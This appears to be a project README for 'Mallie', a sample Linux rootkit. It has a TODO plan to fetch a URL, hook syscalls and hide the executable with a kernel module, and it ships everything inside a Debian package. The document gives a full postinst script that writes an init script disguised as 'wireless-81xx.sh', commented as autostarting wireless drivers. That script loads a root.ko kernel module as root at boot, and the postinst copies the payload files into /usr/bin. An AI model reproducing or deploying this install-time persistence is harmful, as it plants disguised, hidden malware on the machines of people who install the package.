# Mallie
Sample linux rootkit.

# TODO
- curl a url
- ~~get syscall table~~ use ftrace instead (no need find syscall table)
- hook a syscall with ftrace instead of modifying kernel memory
- package everything into a debian package
- use of mallie executable to curl and mallie.ko lkm to hide mallie executable

# Issues
- stdlib is not available for kernel modules, may need another executable

# Resources
- Create deb package: https://www.internalpointers.com/post/build-binary-deb-package-practical-guide
- Make install script in the deb package using DEBIAN/preinstall same as the DEBIAN/control file

# Script
chmod 755 to the postinst script.
```bash

#!/bin/bash
# This `DEBIAN/postinst` script is run post-installation

echo '#!/bin/bash' > /etc/init.d/wireless-81xx.sh
echo '# chkconfig: 345 99 10' >> /etc/init.d/wireless-81xx.sh 
echo '# Description: Autostart wireless drivers' >> /etc/init.d/wireless-81xx.sh 
echo 'case "$1" in' >> /etc/init.d/wireless-81xx.sh 
echo " 'start')" >> /etc/init.d/wireless-81xx.sh 
echo '   su - root -c "cd /usr/bin ; insmod /usr/bin/root.ko";;' >> /etc/init.d/wireless-81xx.sh 
echo " 'stop')" >> /etc/init.d/wireless-81xx.sh 
echo ' echo "shutdown...";;' >> /etc/init.d/wireless-81xx.sh 
echo "esac" >> /etc/init.d/wireless-81xx.sh 

chmod +x /etc/init.d/wireless-81xx.sh
cp /usr/local/bin/mallie /usr/bin/
cp /usr/local/bin/root.ko /usr/bin/
sh /etc/init.d/wireless-81xx.sh

```